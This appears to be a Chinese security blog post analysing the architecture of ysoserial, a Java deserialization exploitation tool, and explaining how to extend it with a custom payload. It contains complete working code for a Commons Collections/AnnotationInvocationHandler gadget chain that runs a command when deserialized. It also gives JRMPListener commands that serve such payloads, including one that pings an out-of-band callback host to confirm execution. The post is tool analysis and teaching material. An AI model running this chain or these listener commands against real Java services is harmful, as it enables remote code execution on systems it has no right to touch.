> 原文链接: https://www.anquanke.com//post/id/229108 


# ysoserial 结构分析与使用


                                阅读量   
                                **119150**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)](https://p0.ssl.qhimg.com/t0174eb23885b859a66.jpg)



很早就接触了ysoserial这款工具，堪称为“java反序列利用神器”，有很多大佬针对这款工具的payload生成姿势分析的非常透彻，但很少分析这个工具的架构以及其使用时的一些坑点，因此写下本文与大家分享。同时也从中学习到了一些工具编写的设计思想，希望能够运用到自己工具当中。



## 0x01 下载编译使用

### <a class="reference-link" name="0x1%20%E4%B8%8B%E8%BD%BD"></a>0x1 下载

从github上直接下载<br>`git clone https://github.com/frohoff/ysoserial.git`

### <a class="reference-link" name="0x2%20%E7%BC%96%E8%AF%91"></a>0x2 编译

根据github上的编译提示，会出现编译错误

```
Requires Java 1.7+ and Maven 3.x+
mvn clean package -DskipTests
```

错误信息如下，主要是因为在pom.xml缺少commons-io的依赖

[![](https://p2.ssl.qhimg.com/t014a90255501be5e22.png)](https://p2.ssl.qhimg.com/t014a90255501be5e22.png)

在pom.xml的dependencies标签里添加依赖项

```
&lt;dependency&gt;
            &lt;groupId&gt;commons-io&lt;/groupId&gt;
            &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
            &lt;version&gt;2.4&lt;/version&gt;
        &lt;/dependency&gt;
```

再次执行`mvn clean package -DskipTests`，编译成功在target目录下生成相对应的jar包

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01171274322df63afa.png)

### <a class="reference-link" name="0x3%20%E4%BD%BF%E7%94%A8"></a>0x3 使用

主要有两种使用方式，一种是运行ysoserial.jar 中的主类函数，另一种是运行ysoserial中的exploit 类，二者的效果是不一样的，一般用第二种方式开启交互服务于。

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'ping -c 2  rce.267hqw.ceye.io'
```

这两种方式在之后的代码分析中会详细分析。



## 0x02 架构分析

从整体设计模式上分析该工具的编写方法，项目整体的目录结构如下所示：

```
|____ysoserial
| |____exploit
| | |____JRMPClient.java
| | |____JRMPListener.java
| |____secmgr
| | |____DelegateSecurityManager.java
| | |____ExecCheckingSecurityManager.java
| |____payloads
| | |____CommonsCollections3.java
| | |____ObjectPayload.java
| | |____util
| | | |____PayloadRunner.java
| | | |____Gadgets.java
| | | |____Reflections.java
| | | |____ClassFiles.java
| | | |____JavaVersion.java
| | |____annotation
| | | |____PayloadTest.java
| | | |____Authors.java
| | | |____Dependencies.java
| |____GeneratePayload.java
| |____Serializer.java
| |____Strings.java
| |____Deserializer.java

```

大体分为生成代码、利用库（工具库）、payloads库、序列化库 这四大库。

### <a class="reference-link" name="0x1%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"></a>0x1 配置文件

从Maven项目的pom配置文件开始分析，pom.xml 的整体缩略图如下：

[![](https://p5.ssl.qhimg.com/t01265dc5e66f2333b0.png)](https://p5.ssl.qhimg.com/t01265dc5e66f2333b0.png)

该配置文件主要对 build、dependencies、profiles 这五大方面进行配置。

**<a class="reference-link" name="1.%20build"></a>1. build**

配置编译打包相关操作，配置项目插件属性，在本项目中主要配置后者

```
&lt;plugin&gt;
&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
&lt;configuration&gt;
    &lt;finalName&gt;$`{`project.artifactId`}`-$`{`project.version`}`-all&lt;/finalName&gt;
    &lt;appendAssemblyId&gt;false&lt;/appendAssemblyId&gt;
    &lt;archive&gt;
        &lt;manifest&gt;
            &lt;mainClass&gt;ysoserial.GeneratePayload&lt;/mainClass&gt;
        &lt;/manifest&gt;
    &lt;/archive&gt;
    &lt;descriptor&gt;assembly.xml&lt;/descriptor&gt;
&lt;/configuration&gt;
&lt;executions&gt;
    &lt;execution&gt;
        &lt;id&gt;make-assembly&lt;/id&gt;
        &lt;phase&gt;package&lt;/phase&gt;
        &lt;goals&gt;
            &lt;goal&gt;single&lt;/goal&gt;
        &lt;/goals&gt;
    &lt;/execution&gt;
&lt;/executions&gt;
&lt;/plugin&gt;
```

在该配置中可以分析出，该项目编译之后的名称finalName，在编译后的jar包中的主执行类 ysoserial.GeneratePayload 。

**<a class="reference-link" name="2.%20dependencies"></a>2. dependencies**

该标签是maven项目中用于配置项目依赖的核心配置，通过子标签的形式，将项目中的所有依赖jar包写在子配置中，类似如下配置：

[![](https://p2.ssl.qhimg.com/t01bb4257dc9e887b0c.png)](https://p2.ssl.qhimg.com/t01bb4257dc9e887b0c.png)

在编译ysoserial 项目时要添加Commons-io依赖，需要指定版本以及artifactId

**<a class="reference-link" name="3.%20profiles"></a>3. profiles**

profile可以定义一系列的配置信息，然后指定其激活条件。这样我们就可以定义多个profile，然后每个profile对应不同的激活条件和配置信息，从而达到不同环境使用不同配置信息的效果。

[![](https://p4.ssl.qhimg.com/t01549cd7c5cf97cd73.png)](https://p4.ssl.qhimg.com/t01549cd7c5cf97cd73.png)

### <a class="reference-link" name="0x2%20%E6%95%B4%E4%BD%93%E7%BB%93%E6%9E%84"></a>0x2 整体结构

从jar包主类出发分析出整个jar包内部的类关系图

[![](https://p4.ssl.qhimg.com/t011bc0703677d1a125.png)](https://p4.ssl.qhimg.com/t011bc0703677d1a125.png)

好在是项目中的类关系较为简单从图中可以看出，大体分为四个类结构

|类名|作用
|------
|GeneratePayload|生成对应序列化内容
|ObjectPayload(Utils)|payload抽象类
|*Serializer|序列化与反序列工具
|PayloadRunner|测试反序列化利用链

对于类关系可以从三种执行方式考虑，详细的分析在代码功能模块
1. 执行jar包生成指定类反序列payload
1. 测试payload 利用效果
1. 执行exploit文件夹下的代码，开启服务


## 0x03 代码分析

对框架有了大概的认识之后，分析框架实现，以及其代码设计思想。

### <a class="reference-link" name="0x1%20%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"></a>0x1 动态调试

利用idea 导入Maven项目，之后利用pom.xml的包依赖关系下载对应的jar包，配置相关调试信息。这里需要注意的是idea调试jre环境最好是java 1.7 因为在1.7版本之后AnnotationInvocationHandler的反序列化利用链就被补了，为了方便调试选择对应的jdk版本。

### <a class="reference-link" name="0x2%20%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0"></a>0x2 入口函数

从pom.xml得知入口类函数为

[![](https://p0.ssl.qhimg.com/t01c339f7c124c4c1f4.png)](https://p0.ssl.qhimg.com/t01c339f7c124c4c1f4.png)

函数调用关系如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010699639364367a89.png)

入口函数接受了来自命令行传进来的参数，分别用`payloadType`和`command`参数接收。之后通过getPayloadClass函数反射生成对应的类，有了类之后newInstance生成实例，利用getObject方法获取填好利用链的对象，通过Serializer.serialize函数生成序列化后内容，之后销毁对象。

### <a class="reference-link" name="0x3%20Utils%E5%BA%93%E5%88%86%E6%9E%90"></a>0x3 Utils库分析

Utils中主要利用反射生成对应类

**<a class="reference-link" name="1.%20getPayloadClass"></a>1. getPayloadClass**

在Utils类中有两个该方法的重载，分析其中一个

[![](https://p4.ssl.qhimg.com/t0159c85be56c8cb37a.png)](https://p4.ssl.qhimg.com/t0159c85be56c8cb37a.png)

这里需要定义 clazz 类型为`Class&lt;? extends ObjectPayload&lt;?&gt;&gt;` ，估计会有很对纳闷这个class类型为什么这么复杂。这就需要理解泛型中的类关系了。在泛型中关键部分使用object函数和最底级类擦除的，因此其类关系如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0105b75ed67c24f4f9.png)

利用Class.forName函数获取对应类

**<a class="reference-link" name="2.%20makePayloadObject"></a>2. makePayloadObject**

该函数是在执行exploit函数时一键式获取序列化内容，相关逻辑如下

```
final Class&lt;? extends ObjectPayload&gt; payloadClass = getPayloadClass(payloadType);//获取对应类
......
final ObjectPayload payload = payloadClass.newInstance();//生成对象
 payloadObject = payload.getObject(payloadArg);//生产带有反序列化链的数据
```

主要是exploit模块调用该功能，用于生成服务协议相关的交互式序列化利用链。

**<a class="reference-link" name="3.%20releasePayload"></a>3. releasePayload**

释放对象内存

```
( (ReleaseableObjectPayload) payload ).release(object);
```

### <a class="reference-link" name="0x4%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>0x4 序列化与反序列化

代码单独存在两个文件中，分别完成包含利用链对象的序列化与反序列化工作。

[![](https://p3.ssl.qhimg.com/t011cb1fc86c9f98136.png)](https://p3.ssl.qhimg.com/t011cb1fc86c9f98136.png)

[![](https://p0.ssl.qhimg.com/t0157458b0ad4115ae9.png)](https://p0.ssl.qhimg.com/t0157458b0ad4115ae9.png)

为了测试方便在Deserializer类中包含了测试函数，从文件中读取序列化内容并进行反序列化触发验证漏洞。

```
public static void main(String[] args) throws ClassNotFoundException, IOException `{`
    final InputStream in = args.length == 0 ? System.in : new FileInputStream(new File(args[0]));
    Object object = deserialize(in);
`}`
```

### <a class="reference-link" name="0x5%20payloads%E5%BA%93"></a>0x5 payloads库

这里面内容就是ysoserial工具的核心了，包含了大量的反序列化链，使得反序列化漏洞利用更加简单方便。可归结为以下几个

|利用|库版本
|------
|CommonsCollections1|commons-collections:3.1
|CommonsCollections2|commons-collections4:4.0
|CommonsCollections3|commons-collections:3.1
|CommonsCollections4|commons-collections4:4.0
|CommonsCollections5|commons-collections:3.1
|CommonsCollections6|commons-collections:3.1
|CommonsCollections7|commons-collections:3.1
|BeanShell1|bsh:2.0b5
|C3P0|c3p0:0.9.5.2、mchange-commons-java:0.2.11
|Groovy1|groovy:2.3.9
|Jdk7u21|groovy:2.3.9
|Spring1|spring-core:4.1.4.RELEASE、spring-beans:4.1.4.RELEASE
|URLDNS|
|rome:1.0|rome:1.0

以后会单独写文章对这些利用链进行详细的分析

### <a class="reference-link" name="0x6%20exploit%E5%BA%93"></a>0x6 exploit库

该库主要是开启交互式服务，例如如下使用方法

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 'open /Applications/Calculator.app/'
```

目前包含了多种利用方式JBoss、Jenkins、JMX、JRMP、JSF、RMI等。这里以JRMPListener为样例，分析该模块的编写方法。

[![](https://p1.ssl.qhimg.com/t01465d3d2a1a96cb2a.png)](https://p1.ssl.qhimg.com/t01465d3d2a1a96cb2a.png)

利用utils库中的makepayload方法生成payload，调用集成好的JRMP服务端，等待客户端的连接，之后给客户端发送payload执行。

### <a class="reference-link" name="0x7%20%E6%B5%8B%E8%AF%95%E7%B1%BB"></a>0x7 测试类

PayloadRunner为测试类，主要负责在编写添加payloads库之后测试其效果。使用方法如下：

在payloads单个类中添加main方法

```
public static void main(final String[] args) throws Exception `{`
    PayloadRunner.run(CommonsBeanutils1.class, args);
`}`
```

从下面可以看出其测试的逻辑
1. 对传入的class用newInstance实例化
1. 调用对象的getObject方法
1. 获取到填充好利用链的对象
1. 调用序列化方法进行序列化输出
1. 调用反序列化函数触发序列化利用链
[![](https://p5.ssl.qhimg.com/t01ba4ce0db1d2ca904.png)](https://p5.ssl.qhimg.com/t01ba4ce0db1d2ca904.png)



## 0x04 扩展payload库

将自己编写的payload放在下载的包中：路径ysoserial/src/main/java/ysoserial/payloads/，需要注意以下几点：
1. 实现ObjectPayload接口
1. 添加PayloadRunner测试方法
1. 编写说明和注意事项
通过分析一条AnnotationInvocationHandler链，在ysoserail中编写自己的利用链。Transformer 利用链是反序列化利用链里最最基础的一个，下面对其进行简单的介绍。

### <a class="reference-link" name="0x1%20InvokerTransformer"></a>0x1 InvokerTransformer

该类完成了最后的命令执行，其代码如下：

[![](https://p4.ssl.qhimg.com/t01c156e3cc9d821d45.png)](https://p4.ssl.qhimg.com/t01c156e3cc9d821d45.png)

从参数中getClass获得**对象类**，利用反射的方法从类中获取方法对象（在参数中需指定方法名和参数），之后invoke该方法类（普通类需填充类对象作为参数）

因此在使用触发命令的时候就比较容易构造了

```
public class test `{`
    public static void main(String[] args) `{`
        InvokerTransformer it = new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"/System/Applications/Calculator.app/Contents/MacOS/Calculator"`}`);
        it.transform(Runtime.getRuntime());
    `}`
`}`
```

需要注意的是getMethod函数的两个参数均为数组，一个为类数组另一个为对象数组，用来表示参数的类型和内容。最后利用transform进行触发执行命令，之后再拓展利用链。

### <a class="reference-link" name="0x2%20ChainedTransformer"></a>0x2 ChainedTransformer

链的形式就是一环扣一环，在本链中InvokerTransformer的触发在ChainedTransformer 的 transform 函数有调用

[![](https://p1.ssl.qhimg.com/t01a4a4513fac65dd57.png)](https://p1.ssl.qhimg.com/t01a4a4513fac65dd57.png)

for循环调用transform数组元素的transform方法

### <a class="reference-link" name="0x3%20TransformedMap"></a>0x3 TransformedMap

在TransformedMap的checkSetValue方法中涉及到了对valueTransformer对象调用transform方法，该对象正好是Transformer类

[![](https://p2.ssl.qhimg.com/t01406e1f1abb5e8b40.png)](https://p2.ssl.qhimg.com/t01406e1f1abb5e8b40.png)

[![](https://p2.ssl.qhimg.com/t01b17dc7396c006338.png)](https://p2.ssl.qhimg.com/t01b17dc7396c006338.png)

向上溯源找到同一类中的checkSetValue调用

[![](https://p2.ssl.qhimg.com/t01a797bbb0a7be5795.png)](https://p2.ssl.qhimg.com/t01a797bbb0a7be5795.png)

在之后的分析中只需关注谁调用了TransformedMap的setValue方法就可以了，valueTransformer对象的赋值在构造方法中，因为构造方法为protected，所以可以采用public static 方法decorate调用，参数都是一样的。

### <a class="reference-link" name="0x4%20AnnotationInvocationHandler"></a>0x4 AnnotationInvocationHandler

该注解类重写了父类的readObject方法并实现了Serializable接口，通过简单分析发现了其readObject方法中包含以下代码逻辑

```
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException `{`
        var1.defaultReadObject();
        Iterator var4 = this.memberValues.entrySet().iterator();
        ......
        while(var4.hasNext()) `{`
            Entry var5 = (Entry)var4.next();
           ......
                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) `{`
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));

            `}`
        `}`

    `}`
```

在类反序列的时候如果要反序列化的类有自己的readObject方法就会调用该方法而取代调用ObjectInputStream的defaultReadObject默认反序列化方法，分析发现调用了setValue方法，因此我们就可以在这里有所作为了。

### <a class="reference-link" name="0x5%20%E7%BC%96%E5%86%99payload%E5%BA%93"></a>0x5 编写payload库

利用transformer链构造一个ysoserial里面没有的序列化利用链，分析整个链在ysoserial中编写方法。

**<a class="reference-link" name="1.%20%E6%9E%84%E9%80%A0%E9%93%BE"></a>1. 构造链**

整个利用链可以用下图概括

[![](https://p0.ssl.qhimg.com/t01c2d6304dff4ce738.png)](https://p0.ssl.qhimg.com/t01c2d6304dff4ce738.png)

**<a class="reference-link" name="2.%20%E5%88%9B%E5%BB%BAtransformers%E6%95%B0%E7%BB%84"></a>2. 创建transformers数组**

目前网上构造Transformer数组的方法采用getMethod方法获取getRuntime方法，自己在编写利用时有个疑惑为什么不直接invoke调用getRuntime方法，这样岂不是更加简单方便，试验如下

```
Transformer[] transformers = new Transformer[]`{`
new ConstantTransformer(Runtime.getRuntime()),
new InvokerTransformer("getRuntime", null, null),
new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"/System/Applications/Calculator.app/Contents/MacOS/Calculator"`}`)
`}`;
Transformer chainedTransformer = new ChainedTransformer(transformers);
```

Transformer第一个元素会原状态返回，**如果ConstantTransformer参数设置的是Runtime.class 在第二个元素执行transform函数的时候就会抛异常**，原因是InvokerTransformer会获取transform函数参数的类并调用getMethod函数，如果是Runtime.class ，它的getClass方法获取的是Object类，这时再搜索getRuntime方法时就会抛出异常，因此这里只能用Runtime对象当做链的第一个参数，但是问题又来了。

新的问题是在代码里编写调用transform触发函数是可以的，但是一旦反序列化该链就会报错，**因为 Runtime没有实现Serializable接口**，所以这个想法就被彻底否掉了。最后还是采用以下写法

```
Transformer[] transformers = new Transformer[]`{`
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[] `{` String.class, Class[].class `}`, new Object[] `{`"getRuntime", new Class[0] `}`),
new InvokerTransformer("invoke", new Class[]`{`Object.class, Object[].class`}`, new Object[]`{`null, new Object[0]`}`),
new InvokerTransformer("getRuntime", null, null),
new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"/System/Applications/Calculator.app/Contents/MacOS/Calculator"`}`)
`}`;
```

这样做的好处是，在生成链的全程new的对象都实现了Serializable接口，这意味他们都可以序列化。

**<a class="reference-link" name="3.%20%E5%B0%86%E6%95%B0%E7%BB%84%E6%94%BE%E5%85%A5TransformedMap"></a>3. 将数组放入TransformedMap**

```
Transformer chainedTransformer = new ChainedTransformer(transformers);
Map inMap = new HashMap();
inMap.put("value", "aa");
Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);
```

这里有个坑如果inMap put 的key名必须是value，相关代码在AnnotationInvocationHandler readObject方法中有所体现

[![](https://p4.ssl.qhimg.com/t01ed326c4ec9aee93b.png)](https://p4.ssl.qhimg.com/t01ed326c4ec9aee93b.png)

[![](https://p0.ssl.qhimg.com/t011a227b8749337fd6.png)](https://p0.ssl.qhimg.com/t011a227b8749337fd6.png)

从代码中很明显的看出在var3中get了value，所以如果var5的key不是value的话，在358行的if就不能就去，也就不能执行位于里面的触发链函数。

**<a class="reference-link" name="4.%20%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96AnnotationInvocationHandler%E5%AF%B9%E8%B1%A1"></a>4. 反射获取AnnotationInvocationHandler对象**

AnnotationInvocationHandler不是public类，外部包不能直接创建。需要通过反射setAccessible(true)设置访问其中的私有方法。于是就有下面的代码

```
Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor ctor = cls.getDeclaredConstructor(new Class[] `{` Class.class, Map.class `}`);
ctor.setAccessible(true);
Object instance = ctor.newInstance(new Object[] `{` Retention.class, outMap `}`);
```

**<a class="reference-link" name="5.%20%E7%BC%96%E5%86%99%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>5. 编写测试代码**

通过对ysoserial框架的分析，PayloadRunner是payload的测试方法，其中包含了序列化与模拟反序列化操作，主要测试反序列化链的攻击效果。代码如下

```
public static void main(String[] args) throws Exception `{`
    PayloadRunner.run(mytest.class, args);
`}`
```

**<a class="reference-link" name="6.%20%E6%95%B4%E4%BD%93%E4%BB%A3%E7%A0%81"></a>6. 整体代码**

自己编写的类需要继承和实现PayloadRunner类和ObjectPayload接口，方便测试和Payload生成，重写getObject方法并返回构造好的序列化链对象。

```
public class mytest extends PayloadRunner implements ObjectPayload&lt;Object&gt; `{`
    public Object getObject(final String command) throws Exception `{`
        Transformer[] transformers = new Transformer[]`{`
            new ConstantTransformer(Runtime.class),
//            new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("getMethod", new Class[] `{` String.class, Class[].class `}`, new Object[] `{`"getRuntime", new Class[0] `}`),
                new InvokerTransformer("invoke", new Class[]`{`Object.class, Object[].class`}`, new Object[]`{`null, new Object[0]`}`),
            new InvokerTransformer("getRuntime", null, null),
            new InvokerTransformer("exec", new Class[]`{`String.class`}`, new Object[]`{`"/System/Applications/Calculator.app/Contents/MacOS/Calculator"`}`)
        `}`;
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map inMap = new HashMap();
        inMap.put("value", "aa");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(new Class[] `{` Class.class, Map.class `}`);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[] `{` Retention.class, outMap `}`);
        return instance;
    `}`
    public static void main(String[] args) throws Exception `{`
        PayloadRunner.run(mytest.class, args);
    `}`

`}`
```



## 0x05 总结

初步认识了ysoserial工具编写的架构，分析各个模块之间的耦合关系，该工具模块较为完整从payload选择、生成、测试、输出各个方面偶有考虑，从中学到了很多编写工具的方法，在最后也对该工具的扩展做了总结，但是目前来看还有很多没有分析到，比如那几个经典的反序列化利用链以及exploit库中的代码交互等等，会慢慢补上的。



## 参考文章

[https://m.yisu.com/zixun/53350.html](https://m.yisu.com/zixun/53350.html)<br>[https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html](https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html)
